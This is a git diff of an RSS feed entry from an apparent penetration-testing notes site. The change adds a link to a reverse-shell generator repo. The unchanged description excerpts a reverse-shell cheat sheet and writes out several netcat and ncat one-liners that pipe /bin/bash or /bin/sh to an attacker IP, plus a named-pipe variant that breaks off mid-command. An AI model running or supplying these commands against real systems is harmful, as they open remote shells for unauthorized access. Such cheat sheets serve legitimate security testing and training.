@@ -46,7 +46,7 @@ Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/reverse/</guid>
-      <description>Resources https://alamot.github.io/reverse_shells/ 
+      <description>Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator 
 Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  
 Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
     </item>
